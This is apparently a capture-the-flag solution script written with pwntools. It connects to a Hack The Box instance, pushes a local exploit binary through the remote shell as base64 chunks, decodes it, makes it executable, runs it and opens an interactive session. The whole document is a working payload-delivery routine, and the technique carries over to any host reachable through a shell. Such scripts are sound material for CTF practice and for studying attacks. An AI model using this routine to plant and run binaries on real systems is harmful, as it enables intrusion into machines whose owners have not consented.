from pwn import *

r = remote("docker.hackthebox.eu", 30704)
context.log_level = 'debug'
r.sendlineafter(b"$", b'echo "start" >&2; while read line; do if [ "$line" = "end" ]; then break; fi; echo -n $line; done > /home/ctf/tmp')

payload = b64e(read("exp"))
r.recvuntil(b"start\r\n");
sleep(0.5)
to_send = payload.encode()
while to_send:
    r.sendline(to_send[:1000])
    to_send = to_send[1000:]
r.send(b"\nend\n")

r.sendlineafter(b"$", b"base64 -d /home/ctf/tmp > /home/ctf/exploit; chmod +x /home/ctf/exploit")
r.sendlineafter(b"$", b"cd /home/ctf")
r.sendlineafter(b"$", b"./exploit")
r.interactive()